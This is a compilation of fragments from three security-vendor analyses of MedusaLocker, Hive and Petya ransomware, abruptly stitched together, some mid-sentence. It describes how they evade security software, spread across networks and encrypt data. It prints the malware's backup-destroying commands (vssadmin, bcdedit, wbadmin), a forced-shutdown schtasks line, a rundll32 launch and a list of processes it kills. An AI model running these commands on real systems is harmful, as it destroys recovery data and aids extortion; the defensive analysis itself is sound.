tree:\n\n1/7\n\nhttps://www.cybereason.com/blog/medusalocker-ransomware\nhttps://www.cybereason.com/blog\nhttps://www.cyber.nj.gov/threat-profiles/ransomware-variants/medusalocker\nhttps://www.infosecurity-magazine.com/news/hospitals-targeted-ransomware/\nhttps://www.crowdstrike.com/blog/double-trouble-ransomware-data-leak-extortion-part-1/\nhttps://www.cybereason.com/blog/ransomware-weapons-of-mass-disruption\n\n\nMedusaLocker Batch file execution\n\nAfter the machine is restarted in safe mode, the created service executes and the powershell script runs. This powershell script is a PowerSploit\nscript known as “Invoke-ReflectivePEInjection”. The script reflectively loads the MedusaLocker ransomware to the powershell process memory.\n\nThe MedusaLocker binary encoded with base64 in the script:\n\nPowershell script snippet\n\nMutex Detection\n\nThe first thing MedusaLocker does is to check if a process with the mutex “{8761ABBD-7F85-42EE-B272-A76179687C63}” exists on the\nmachine. If the mutex already exists, the ransomware will stop its execution.\n\nCMSTP UAC BYPASS / Privilege Escalation\n\nMedusaLocker uses a known UAC bypass technique also used by other malware such as Trickbot that allows the ransomware to run with\nescalated privileges that enable it to carry out administrative operations. It achieves privilege escalation by leveraging the built-in Windows tool\nCMSTP.exe to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. An\nimplementation of that technique can be found on Github: https://gist.github.com/hfiref0x/196af729106b780db1c73428b5a5d68d\n\nAn almost identical implementation of the above method was seen used in our analyzed samples:\n\nUAC bypass code in IDA\n\nPersistence\n\n2/7\n\nhttps://github.com/PowerShellMafia/PowerSploit\nhttps://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/\nhttps://attack.mitre.org/techniques/T1191/\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware\nhttps://attack.mitre.org/techniques/T1088\nhttps://gist.github.com/hfiref0x/196af729106b780db1c73428b5a5d68d\n\n\nMedusaLocker creates creates a copy of the malware executable in the path: “%AppData%\\Roaming\\svhost.exe”, or\n“%AppData%\\Roaming\\svchostt.exe” (depends on the malware variant). And then, creates persistence by a scheduled task named “svhost”\nwhich executes every 15 minutes:\n\nScheduled task in Cybereason\n\nBypassing Security Products\n\nMedusaLocker will attempt to disable or terminate certain process and security products:\n\nwxServer.exe,wxServerView,sqlservr.exe,sqlmangr.exe,RAgui.exe,supervise.exe,Culture.exe,RTVscan.exe,Defwatch.exe,sqlbrowser.exe,winword.exe,QBW32.exe,QBDBMgr.exe,qbupdate.exe,QBCFMonitorService.exe,axlbridge.exe,QBIDPService.exe,httpd.exe,fdlauncher.exe,MsDtSrvr.exe,tomcat6.exe,java.exe,360se.exe,360doctor.exe,wdswfsafe.exe,fdlauncher.exe,fdhost.exe,GDscan.exe,ZhuDongFangYu.exe\n\nIn addition, it will attempt to disable the following services:\n\nwrapper,DefWatch,ccEvtMgr,ccSetMgr,SavRoam,sqlservr,sqlagent,sqladhlp,Culserver,RTVscan,sqlbrowser,SQLADHLP,QBIDPService,Intuit.QuickBooks.FCS,QBCFMonitorService,sqlwriter,msmdsrv,tomcat6,zhudongfangyu,SQLADHLP,vmware-\nusbarbitator64,vmware-converter,dbsrv12,dbeng8\n\nDeleting Backups and Preventing Recovery\n\nMedusaLocker uses the following hardcoded commands to remove backups in order to foil any recovery attempts:\n\nHardcoded commands in the malware\n\nCommand\n\nPurpose\n\nvssadmin.exe Delete Shadows /All /Quiet\n\nDeleting all shadow copy volumes\n\nbcdedit.exe /set {default} recoveryenabled No\n\nDisabling Automatic Startup Repair\n\nbcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\n\nDisabling Windows Error Recovery on startup\n\nwbadmin DELETE SYSTEMSTATEBACKUP\n\nDeleting backup for Windows Server\n\nwbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest\n\nDeleting the oldest backup on Windows Server\n\nMedusaLocker execution in the memory of powersehll.exe:\n\n3/7\n\n\n\nMedusaLocker execution from Powershell\n\nScanning and Propagating to Remote Machines\n\nAfter a successful infection, the MedusaLocker will scan the entire subnet in order to detect other hosts and shared folders. The ransomware\nedits the value “EnableLinkedConnections” of the following registry key:\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\CurrentVersion\\Policies\\System\n\n“EnableLinkedConnections” value is changed\n\nIt does that so it can connect to other adjacent hosts residing on the same network, and in addition, tries to ping the entire subnet to see which\nhosts are alive:\n\nPing sweep to find live hosts\n\nEncryption Whitelist Folders\n\nMedusaLocker avoids encrypting executable files as well as taking a whitelisting approach, and encrypts files in most folders with the exception\nof:\n\n%User Profile%\\AppData\n\n\\ProgramData\n\n\\Program Files\n\n\\Program Files (x86)\n\n\\AppData\n\n\\Application Data\n\n\\intel\n\n\\nvidia\n\n\\Users\\All Users\n\n\\Windows\n\nRansom Note\n\nAlthough the ransom note of MeduzaLocker states that data has been exfiltrated, we have not observed indications of such behavior at the\nmoment by the malware:\n\n4/7\n\n\n\nRansom note\n\nCybereason Detection and Prevention\n\nCybereason is able to both detect and prevent the execution of MedusaLocker using the powershell protection component:\n\nMalicious powershell script prevented\n\nAdditionally, when the Anti-Ransomware feature is enabled, behavioral detection techniques in the platform are able to detect the deletion of the\nshadow copies using vssadmin.exe, which will create a Malop for the ransomware behaviour:\n\nRansomware prevented\n\nMitre Att&ck Breakdown\n\nExecution Persistence Privilege Escalation Defense

We take an in-\ndepth look at the ransomware group’s operations and discuss how organizations can bolster their defenses against it.\n\nhttps://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-hive\n\n\n2/8\n\n View infographic of \"Ransomware Spotlight: Hive\"\n\nWhile some ransomware groups operating as ransomware-as-a-service (RaaS) networks claim to steer clear of targeting specific sectors such\nas hospitals or other critical industries to avoid causing harm to people, Hive’s attacks against healthcare providers in 2021 showed that\nthe operators behind it have no regard for such humanitarian considerations. A hospital in Missouri suffered a Hive ransomware attack three\nweeks after the same group hit the integrated systems of a healthcare provider that affected three hospitals and many outpatient clinics in two\nother US states. Hive ransomware has become one of the most active ransomware families since its discovery in June 2021. To defend\nagainst this threat, it is therefore crucial for companies to be acquainted with the various mechanisms that the infamous ransomware gang\nuses.\n\nWhat do organizations need to know about Hive?\n\n \n\nOn August 15, 2021, Hive’s ransomware attacks against a non-profit integrated health system severely disrupted the clinical and financial\noperations of three hospitals in Ohio and West Virginia. The attack resulted in emergency room diversions and cancelation of urgent surgical\ncases and radiology examinations. The encryption of files forced the hospital staff to use paper charts. Aside from the three hospitals, the\naffected non-profit also runs several outpatient service sites and clinics with a combined workforce of 3,000 employees.\n\nHive operators used double extortion techniques in this attack. Aside from the encryption of data, they also stole patient information that they\nthreatened to publish on HiveLeaks, their dedicated leak site. The gang shares the list of victims that have not paid the ransom on their Tor\nsite.\n\nThe incident prompted the FBI to issue an alert in late August that detailed Hive ransomware’s indicators of compromise (IOCs) and tactics,\ntechniques, and procedures (TTPs). According to the alert, Hive operators use phishing emails with malicious attachments to gain initial\naccess to the system and Remote Desktop Protocol (RDP) to move laterally once on the network.\n\nThe motivation of those in the cyber-underground to expand their foothold inevitably leads to the incursion of uncharted paths. In late October\n2021, threat researchers discovered that Hive has new malware tools specifically developed to encrypt Linux and FreeBSD systems. The\nreport notes that Hive is among other ransomware operators that have set their sights on Linux servers. Other notorious ransomware groups\nhave also been known to create their own Linux encryptors.\n\nAs enterprises slowly migrate to virtual machines to achieve better device management and optimize the use of resources, targeting virtual\nmachines also makes good business sense for RaaS operators because it enables them to encrypt multiple servers simultaneously with just\none command. Researchers pointed out that Hive’s bespoke tool for Linux is not fully functional yet as it still cannot completely encrypt all files\nwhen the malware was deployed in an explicit path. However, one can expect Hive to keep refining their Linux encryptors to diversify and\nfortify its malware tool kit.\n\nhttps://documents.trendmicro.com/images/TEx/articles/Hive-Infographic-KXmihKp.png\nhttps://www.trendmicro.com/vinfo/us/security/definition/ransomware\nhttps://www.trendmicro.com/vinfo/tr/security/definition/ransomware-as-a-service-raas\nhttps://healthitsecurity.com/news/hive-ransomware-continues-to-attack-healthcare-providers#:~:text=Hive%20Ransomware%20Group%20Attacks%20Missouri,Louis%20Public%20Radio%20reported.\nhttps://www.bleepingcomputer.com/news/security/hive-ransomware-attacks-memorial-health-system-steals-patient-data/\nhttps://www.bleepingcomputer.com/news/security/hive-ransomware-attacks-memorial-health-system-steals-patient-data/\nhttps://www.bleepingcomputer.com/news/security/hive-ransomware-attacks-memorial-health-system-steals-patient-data/\nhttps://mhsystem.org/cyberattack\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti\nhttps://www.documentcloud.org/documents/21049431-fbi-flash-hive-ransomware-iocs\nhttps://www.bleepingcomputer.com/news/security/hive-ransomware-now-encrypts-linux-and-freebsd-systems/\n\n\n3/8\n\nIn January 2022, one of Europe’s largest car dealers suffered a Hive ransomware attack. The Swiss company’s name appeared as one of the\nvictims on HiveLeaks in February. Targeting high-value enterprises has become a trend for ransomware operators as can be gleaned from the\nprofile of the victim that reportedly generated US$3.29 billion in revenues for 2020.\n\nOverview of Hive’s operations\n\nHive operations are more prolific than their leak site might suggest. HiveLeaks only publishes the list of victims that have not settled the\nransom, so it is tough to determine which — or how many — companies decided to pay the ransom. A report indicates that attack attempts by\nHive affiliates hit an average of three companies per day since the group was first discovered in June 2021. The report also mentioned that\nsecurity researchers who got access to information directly from the administrator panel of the Hive Tor site discovered that the number of\nenterprises whose systems had been compromised have reached 355 from September to December 2021.\n\nIntelligence gathered by the researchers further revealed that the founders of the group deliberately put systems in place to achieve as much\nease and transparency as possible particularly in the process of ransomware deployment and negotiations. Researchers also learned that the\ngeneration of malware versions by affiliates can be done within 15 minutes, while negotiations are coursed through the Hive ransomware\nadministrators who relay the message to the victims in a chat window that the affiliates can see.\n\nResearchers also shared that affiliates can see on the Hive administrator panel how much money was collected, the list of companies that\npaid, and those whose information was leaked.\n\nThe group’s emphasis on operational efficiency and transparency is key to enticing new affiliates. It suggests that the group is aiming for\nsustainability by creating an environment that is conducive to building a bigger and stronger affiliate base.\n\nOf note is that some enterprises complained about the decryption tool that Hive operators provided after settling the ransom. Reports said it\nlacked proper functionality and claimed that the Master Boot Records of their virtual machines were corrupted, rendering them incapable of\nbooting.\n\nTop affected countries and industries\n\nThis section cites Trend Micro™ Smart Protection Network™ (SPN) data on Hive’s attempts to compromise organizations. Our detections\nshow that Hive ransomware attack attempts against organizations were observed the most in South America, with Argentina receiving the\nhighest number followed by Brazil. The United States takes the third spot, while the rest are spread across Europe, Asia, and the Middle East.\n\nFigure 1. 10 countries with the highest number of attack attempts per machine for Hive ransomware (August 1, 2021 to February 28, 2022)\n Source: Trend Micro Smart Protection Network\n\nThe energy sector had the highest number of attack attempts at 186; healthcare came in second at 125, followed by the financial sector with\n102 detections.\n\n \n\nhttps://www.zdnet.com/article/europes-biggest-car-dealer-hit-with-ransomware-attack/\nhttps://www.bleepingcomputer.com/news/security/hive-ransomware-enters-big-league-with-hundreds-breached-in-four-months/\nhttps://www.bleepingcomputer.com/news/security/hive-ransomware-enters-big-league-with-hundreds-breached-in-four-months/\nhttps://www.bleepingcomputer.com/news/security/hive-ransomware-enters-big-league-with-hundreds-breached-in-four-months/\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Hive-Fig-1-bIF8mUp.png\n\n\n4/8\n\nFigure 2. 10 industries with the highest number of attack attempts per machine for Hive ransomware (August 1, 2021 to February 28, 2022)\n Source: Trend Micro Smart Protection Network\n\nBy breaking down the detections per month, our findings reveal that attack attempts peaked in November 2021 at 429. Hive operators were\nmost active in the fourth quarter of 2021 as detections in December and October were the second and third highest numbers, respectively.\n\nFigure 3. Monthly breakdown of detections per machine for Hive ransomware (August 1, 2021 to February 28, 2022)\n Source: Trend Micro Smart Protection Network\n\nTargeted regions and sectors according to Hive’s leak site\n\nAn examination of the information that can be found on HiveLeaks reveals the number of successfully compromised companies that, as of this\nwriting, have declined to pay the ransom. In our monitoring of their leak site from December 1, 2021 to February 28, 2022, attacks were\nhighest in North America at 45.2% followed by Europe at 29% and Latin America at 12.9%.\n\nFigure 4. Regional distribution of Hive victims according to the group’s leak site (December 1, 2021 to February 28, 2022)\n\nEnterprises appear to be Hive’s preferred targets estimated at almost 40%. Their victims were from a wide range of sectors, with technology at\nthe top of the list having a victim count of 5. The healthcare and transportation sectors follow at 4 victims each. Other affected industries\ninclude construction, media and entertainment, professional services, retail, materials, automotive, apparel and fashion.\n\n \n\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Hive-Fig-2-A5yoVWV.png\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Hive-Fig-3-JJD0QIl.png\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Hive-Fig-4-7rO2ZaV.png\n\n\n5/8\n\nFigure 5. Sector distribution of Hive victims according to the group’s leak site (December 1, 2021 to February 28, 2022)\n\nData observed in the same time frame showed that most of the attacks took place on weekdays as malicious activities on weekends comprise\nonly 6.5%.\n\nInfection chain and techniques\n\nFigure 6. Infection chain of Hive ransomware\n\n \n\nInitial Access\n\nHive operators breach systems through phishing emails with malicious attachments.  We also observed Microsoft Exchange as a possible\nentry point for Hive ransomware based on our detection of the same post-exploitation scripts that can be found in the technique used to exploit\nProxyShell-related vulnerabilities. These vulnerabilities were identified as CVE-2021-31207,  CVE-2021-34473 and CVE-2021-34523.\n\n \n\nExecution\n\nHive operators attempt to run the persistence technique for a Cobalt Strike beacon that can be used as a C&C method to accomplish lateral\nmovement once they intrude into the system. Right after the attempt, Hive operators start to unload or uninstall antivirus (AV) products in the\nsystem so they can proceed to the download and execution of hacking tools such as PCHunter, GMER, and TrojanSpy.DATASPY. They use\nthese tools to unload other AV products as a tactic to evade detection. We also observed the presence of WMI used to deploy uninstallation\nscripts and ransomware across the networks for lateral movement.\n\n \n\nDefense Evasion, Discovery, and Credential Access\n\nWe observed the presence of PCHunter and GMER as their tools to discover and terminate services or processes to disable AV software. We\nalso detected the use of TrojanSpy.DATASPY to gather information in the system such as machines in the network and the presence of\nspecific AV products. In another attack, the threat actors deployed KillAV to terminate several AV products, also to avoid detection.\n\n \n\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Hive-Fig-5-eHHfkGm.png\nhttps://documents.trendmicro.com/images/TEx/articles/RS-Hive-Fig-6-AohuiEf.png\nhttps://www.trendmicro.com/en_us/research/21/k/analyzing-proxyshell-related-incidents-via-trend-micro-managed-x.html\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31207\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34473\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34523\nhttps://www.trendmicro.com/en_us/research/21/g/tracking_cobalt_strike_a_vision_one_investigation.html#:~:text=Cobalt%20Strike%20is%20a%20well,and%20remove%20a%20malware%20infection.\nhttps://success.trendmicro.com/solution/1121033-what-to-do-in-case-of-command-and-control-c-c-callback-detection\nhttps://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/PUA.Win64.PCHunter.A/\nhttps://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/pua.win32.gmer.a/\nhttps://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojanspy.ps1.dataspy.a/\nhttps://documents.trendmicro.com/assets/wp/wp-understanding-wmi-malware.pdf\nhttps://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojan.win32.killav.wlde/\n\n\n6/8\n\nLateral Movement, Command-and-Control\n\nThe Hive gang uses RDP and WMI to move laterally in the compromised network and deliver the payload remotely. We also detected the use\nof a BITSAdmin command for lateral movement. The threat actors also used PsExec to move laterally within the network.\n\n \n\nExfiltration\n\nOur detections showed that the Hive operators use 7-Zip tool to archive stolen data for exfiltration. Moreover, the gang abuses anonymous file-\nsharing services such as MEGASync, AnonFiles, SendSpace, and uFile to exfiltrate data.\n\n \n\nImpact\n\nThe ransomware payload proceeds with the encryption routine upon execution. The ransomware generates a random key that is used to\nencrypt based on RTLGenRandom API, which will be initially saved on the device’s memory. The key is then used in what appears to be a\ncustom implementation of the encryption process.\n\nThe key also encrypts through RSA via GoLang’s implementation of RSA encryption. It accomplishes the RSA encryption through a list of\npublic keys embedded in the binary. It is then saved as .key. on the encrypted drive.\n\nThe generated key will then be wiped from memory, leaving the encryption key as the only copy of the key for decryption.\n\nMITRE tactics and techniques\n\nInitial\nAccess Execution Persistence Defense Evasion Discovery\n\nLateral\nMovement Collection\n\nCommand\nand\nControl\n\nT1566.001 -\nPhishing:\nSpear-\nphishing\nattachment \n\n Arrives via\nphishing\nemails.\n\nT1190 -\nExploit\npublic-facing\napplication\n\n Arrives via\nany the\nfollowing\nexploits:•\nCVE-2021-\n34473• CVE-\n2021-\n34523• CVE-\n2021-31207\n\nT1078 -

Our detections of their malicious activities show that their operations are robust, thus providing an incentive for new affiliates to join\nthem. Hive operators are also known to constantly refine and diversify their TTPs, so it is important for companies to stay vigilant and be well-\ninformed of potential threats. An organization stands a better chance of addressing ransomware threats if they implement strong defenses\nearly on.\n\nTo protect systems against similar threats, organizations can establish security frameworks that allocate resources systematically for\nestablishing a strong defense strategy against ransomware.\n\nHere are some best practices that organizations can consider:\n\n \n\nAudit and inventory\n\nTake an inventory of assets and data\nIdentify authorized and unauthorized devices and software\nAudit event and incident logs\n\n \n\nConfigure and monitor\n\n\n\n8/8\n\nManage hardware and software configurations\nGrant admin privileges and access only when necessary to an employee’s role\nMonitor network ports, protocols, and services\nActivate security configurations on network infrastructure devices such as firewalls and routers\nEstablish a software allowlist that only executes legitimate applications\n\n \n\nPatch and update\n\nConduct regular vulnerability assessments\nPerform patching or virtual patching for operating systems and applications \nUpdate software and applications to their latest versions\n\n \n\nProtect and recover\n\nImplement data protection, backup, and recovery measures\nEnable multifactor authentication (MFA)\n\n \n\nSecure and defend\n\nEmploy sandbox analysis to block malicious emails\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network\nDetect early signs of an attack such as the presence of suspicious tools in the system\nUse advanced detection technologies such as those powered by AI and machine learning\n\n \n\nTrain and test\n\nRegularly train and assess employees on security skills.\nConduct red-team exercises and penetration tests.\n\nA multilayered approach can help organizations guard possible entry points into their system (endpoint, email, web, and network). Security\nsolutions can detect malicious components and suspicious behavior, which can help protect enterprises.\n\nTrend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools\nbefore the ransomware can do any damage.\nTrend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities. This\nprotection is made possible through techniques such as virtual patching and machine learning.\nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block\nmalicious emails, including phishing emails that can serve as entry points for ransomware.\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats\nand ransomware, ensuring the protection of endpoints.\n\nIndicators of Compromise (IOCs)\n\nThe IOCs for this article can be found here.

      "plain_text": "1/13\n\nJune 28, 2017\n\nNew ransomware, old techniques: Petya adds worm capabilities\nmicrosoft.com/security/blog/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/\n\nOn June 27, 2017 reports of a ransomware infection began spreading across Europe. We saw the first infections\nin Ukraine, where more than 12,500 machines encountered the threat. We then observed infections in another 64\ncountries, including Belgium, Brazil, Germany, Russia, and the United States.\n\nThe trend towards increasingly sophisticated malware behavior, highlighted by the use of exploits and other\nattack vectors, makes older platforms so much more susceptible to ransomware attacks. From June to\nNovember 2017, Windows 7 devices were 3.4 times more likely to encounter ransomware compared to\nWindows 10 devices.\n\nRead our latest report: A worthy upgrade: Next-gen security on Windows 10 proves resilient against\nransomware outbreaks in 2017\n\n(Note: We have published a follow-up blog entry on this ransomware attack. We have new findings from our\ncontinued investigation, as well as platform mitigation and protection information: Windows 10 platform resilience\nagainst the Petya ransomware attack.)\n\nThe new ransomware has worm capabilities, which allows it to move laterally across infected networks. Based on\nour investigation, this new ransomware shares similar codes and is a new variant of Ransom:Win32/Petya. This\nnew strain of ransomware, however, is more sophisticated.\n\nTo protect our customers, we released cloud-delivered protection updates and made updates to our signature\ndefinition packages shortly after. These updates were automatically delivered to all Microsoft free antimalware\nproducts, including Windows Defender Antivirus and Microsoft Security Essentials. You can download the latest\nversion of these files manually at the Malware Protection Center.\n\nWindows Defender Advanced Threat Protection (Windows Defender ATP) automatically detects behaviors used\nby this new ransomware variant without any updates. To test how Windows Defender ATP can help your\norganization detect, investigate, and respond to advanced attacks, sign up for a free trial.\n\nDelivery and installation\n\nInitial infection appears to involve a software supply-chain threat involving the Ukrainian company M.E.Doc,\nwhich develops tax accounting software, MEDoc. Although this vector was speculated at length by news media\nand security researchers—including Ukraine’s own Cyber Police—there was only circumstantial evidence for this\nvector. Microsoft now has evidence that a few active infections of the ransomware initially started from the\nlegitimate MEDoc updater process. As we highlighted previously, software supply chain attacks are a recent\ndangerous trend with attackers, and it requires advanced defense.\n\nWe observed telemetry showing the MEDoc software updater process (EzVit.exe) executing a malicious\ncommand-line matching this exact attack pattern on Tuesday, June 27 around 10:30 a.m. GMT.\n\nThe execution chain leading to the ransomware installation is represented in the diagram below and essentially\nconfirms that EzVit.exe process from MEDoc, for unknown reasons, at some moment executed the following\ncommand-line:\n\nC:\\\\Windows\\\\system32\\\\rundll32.exe\\” \\”C:\\\\ProgramData\\\\perfc.dat\\”,#1 30\n\nhttps://www.microsoft.com/security/blog/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/\nhttps://www.microsoft.com/en-us/security/portal/mmpc/shared/ransomware.aspx\nhttps://cloudblogs.microsoft.com/microsoftsecure/2018/01/10/a-worthy-upgrade-next-gen-security-on-windows-10-proves-resilient-against-ransomware-outbreaks-in-2017/\nhttps://blogs.technet.microsoft.com/mmpc/2017/06/29/windows-10-platform-resilience-against-the-petya-ransomware-attack/\nhttps://www.microsoft.com/en-us/security/portal/threat/encyclopedia/Entry.aspx?Name=Ransom:Win32/Petya\nhttps://technet.microsoft.com/en-us/itpro/windows/keep-secure/windows-defender-in-windows-10\nhttps://www.microsoft.com/security/portal/definitions/adl.aspx\nhttps://www.microsoft.com/en-us/windowsforbusiness/windows-atp?ocid=cx-blog-mmpc\nhttps://www.microsoft.com/en-us/windowsforbusiness/windows-atp?ocid=cx-blog-mmpc\nhttps://blogs.technet.microsoft.com/mmpc/2017/05/04/windows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack/\n\n\n2/13\n\nThe same update vector was also mentioned by the Ukraine Cyber Police in a public list of indicators of\ncompromise (IOCs) , which includes the MEDoc updater.\n\nA single ransomware, multiple lateral movement techniques\n\nGiven this new ransomware’s added lateral movement capabilities it only takes a single infected machine to\naffect a network. The ransomware spreading functionality is composed of multiple methods responsible for:\n\nstealing credentials or re-using existing active sessions\nusing file-shares to transfer the malicious file across machines on the same network\nusing existing legitimate functionalities to execute the payload or abusing SMB vulnerabilities for unpatched\nmachines\n\nIn the next sections, we discuss the details of each technique.\n\nLateral movement using credential theft and impersonation\n\nThis ransomware drops a credential dumping tool (typically as a .tmp file in the %Temp% folder) that shares code\nsimilarities with Mimikatz and comes in 32-bit and 64-bit variants. Because users frequently log in using accounts\nwith local admin privileges and have active sessions opens across multiple machines, stolen credentials are\nlikely to provide the same level of access the user has on other machines.\n\nOnce the ransomware has valid credentials, it scans the local network to establish valid connections on ports\ntcp/139 and tcp/445. A special behavior is reserved for Domain Controllers or servers: this ransomware attempts\nto call DhcpEnumSubnets() to enumerate DHCP subnets; for each subnet, it gathers all hosts/clients (using\nDhcpEnumSubnetClients()) for scanning for tcp/139 and tcp/445 services. If it gets a response, the malware\nattempts to copy a binary on the remote machine using regular file-transfer functionalities with the stolen\ncredentials.\n\nIt then tries to execute remotely the malware using either PSEXEC or WMIC tools.\n\nhttps://www.microsoft.com/en-us/security/portal/threat/encyclopedia/Entry.aspx?Name=HackTool:Win32/Mimikatz\n\n\n3/13\n\nThe ransomware attempts to drop the legitimate psexec.exe (typically renamed to dllhost.dat) from an embedded\nresource within the malware. It then scans the local network for admin$ shares, copies itself across the network,\nand executes the newly copied malware binary remotely using PSEXEC.\n\nIn addition to credential dumping, the malware also tries to steal credentials by using the CredEnumerateW\nfunction to get all the other user credentials potentially stored on the credential store. If a credential name starts\nwith “TERMSRV/” and the type is set as 1 (generic) it uses that credential to propagate through the network.\n\nRansomware code responsible for accessing \\\\Admin$ shares on different machines\n\nThis ransomware also uses the Windows Management Instrumentation Command-line (WMIC) to find remote\nshares (using NetEnum/NetAdd) to spread to. It uses either a duplicate token of the current user (for existing\nconnections), or a username/password combination (spreading through legit tools).\n\nScreenshot showing launch of malware on a remote machine using WMIC\n\n\n\n4/13\n\nLateral movement using EternalBlue and EternalRomance\n\nThe new ransomware can also spread using an exploit for the Server Message Block (SMB) vulnerability CVE-\n2017-0144 (also known as EternalBlue), which was fixed in security update MS17-010 and was also exploited by\nWannaCrypt to spread to out-of-date machines. In addition, this ransomware also uses a second exploit for CVE-\n2017-0145 (also known as EternalRomance, and fixed by the same bulletin).\n\nWe’ve seen this ransomware attempt to use these exploits by generating SMBv1 packets (which are all XOR\n0xCC encrypted) to trigger these vulnerabilities at the following address of the malware code:\n\nThese two exploits were leaked by a group called Shadow Brokers. However, it is important to note that both of\nthese vulnerabilities have been fixed by Microsoft in security update MS17-010 on March 14, 2017.\n\nMachines that are patched against these exploits (with security update MS17-010) or have disabled SMBv1 are\nnot affected by this particular spreading mechanism. Please refer to our previous blog for details on these\nexploits and how modern Windows 10 mitigations can help to contain similar threats.\n\nEncryption\n\nThis ransomware’s encryption behavior depends on the malware process privilege level and the processes found\nto be running on the machine. It does this by employing a simple XOR-based hashing algorithm on the process\nnames, and checks against the following hash values to use as a behavior exclusion:\n\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144\nhttps://technet.microsoft.com/en-us/library/security/ms17-010.aspx\nhttps://blogs.technet.microsoft.com/mmpc/2017/05/12/wannacrypt-ransomware-worm-targets-out-of-date-systems/\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0145\nhttps://blogs.technet.microsoft.com/mmpc/2017/06/16/analysis-of-the-shadow-brokers-release-and-mitigation-with-windows-10-virtualization-based-security/\nhttps://technet.microsoft.com/en-us/library/security/ms17-010.aspx\nhttps://technet.microsoft.com/en-us/library/security/ms17-010.aspx\nhttps://support.microsoft.com/kb/2696547\nhttps://blogs.technet.microsoft.com/mmpc/2017/06/16/analysis-of-the-shadow-brokers-release-and-mitigation-with-windows-10-virtualization-based-security/\n\n\n5/13\n\n0x6403527E or 0x651B3005 – if these hashes of process names are found running on the machine, then\nthe ransomware does not do SMB exploitation.\n\n0x2E214B44 – if a process with this hashed name is found, the ransomware trashes the first 10 sectors of\n\\\\\\\\.\\\\PhysicalDrive0, including the MBR\n\n\n\n6/13\n\nThis ransomware then writes to the master boot record (MBR) and then sets up the system to reboot. It sets up\nscheduled tasks to shut down the machine after at least 10 minutes past the current time. The exact time is\nrandom (GetTickCount()). For example:\n\nschtasks /Create /SC once /TN “” /TR “<system folder>\\shutdown.exe /r /f” /ST 14:23\n\nAfter successfully modifying the MBR, it displays the following fake system message, which notes a supposed\nerror in the drive and shows the fake integrity checking:\n\nIt then displays this ransom note:\n\n\n\n7/13\n\nOnly if the malware is running with highest privilege (i.e., with SeDebugPrivilege enabled), it tries to overwrite the\nMBR code.\n\nThis ransomware attempts to encrypt all files with the following file name extensions in all folders in all fixed\ndrives, except for C:\\Windows:\n\n.3ds .7z .accdb .ai\n\n.asp .aspx .avhd .back\n\n.bak .c .cfg .conf\n\n.cpp .cs .ctl .dbf\n\n.disk .djvu .doc .docx\n\n.dwg .eml .fdb .gz\n\n.h .hdd .kdbx .mail\n\n.mdb .msg .nrg .ora\n\n.ost .ova .ovf .pdf\n\n.php .pmf .ppt .pptx\n\n.pst .pvi .py .pyc\n\n.rar .rtf .sln .sql\n\n.tar .vbox .vbs .vcb\n\n.vdi .vfd .vmc .vmdk\n\n.vmsd .vmx .vsdx .vsv\n\n.work .xls .xlsx .xvd\n\n.zip\n\nIt uses file mapping APIs instead of a usual ReadFile()/WriteFile() APIs:\n\nUnlike most other ransomware, this threat does not append a new file name extension to encrypted files. Instead,\nit overwrites the said files.\n\nThe AES key generated for encryption is per machine, per fixed drive, and gets exported and encrypted using the\nembedded 2048-bit RSA public key of the attacker.\n\n\n\n8/13\n\nEmbedded RSA public key\n\nCode exporting the AES 128 bit key per machine, per fixed drive in the machine and encrypting it using\nembedded RSA public key during export\n\nThe unique key used for files encryption (AES) is added, in encrypted form, to the README.TXT file the threat\nwrites under section “Your personal installation key:”.\n\nBeyond encrypting files, this ransomware also attempts to infect the MBR or destroy certain sectors of VBR and\nMBR:\n\n\n\n9/13\n\nAfter completing its encryption routine, this ransomware drops a text file called README.TXT in each fixed drive.\nThe said file has the following text:\n\nThis ransomware also clears the System, Setup, Security, Application event logs and deletes NTFS journal info.\n\nDetection and investigation with Windows Defender Advanced Threat Protection\n\nWindows Defender Advanced Threat Protection (Windows Defender ATP) is a post-breach solution and offers\nby-design detections for this attack without need of any signature updates. Windows Defender ATP sensors\nconstantly monitor and collect telemetry from the endpoints and offers machine-learning detections for common\nlateral movement techniques and tools used by this ransomware, including, for example, the execution of\nPsExec.exe with different filename, and the creation of the perfc.dat file in remote shares (UNC) paths.\n\nToday, without the need of additional updates, an infected machine may look like this:\n\nhttps://www.microsoft.com/en-us/windowsforbusiness/windows-atp?ocid=cx-blog-mmpc\n\n\n10/13\n\nThe second alert targets the distribution of the ransomware’s .dll file over the network. This event provides helpful\ninformation during investigation as it includes the User context that was used to move the file remotely. This user\nhas been compromised and could represent the user associated with 